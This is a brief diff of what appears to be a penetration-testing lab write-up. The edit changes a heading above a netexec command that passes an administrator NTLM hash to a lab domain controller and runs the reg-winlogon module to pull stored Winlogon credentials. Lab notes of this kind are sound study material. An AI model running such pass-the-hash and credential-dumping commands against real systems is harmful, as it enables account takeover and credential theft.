@@ -2027,7 +2027,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## -M reg-winlogon
+### -M reg-winlogon
 ```sh
 └─$ netexec smb 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -M reg-winlogon  --debug
 [12:16:24] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
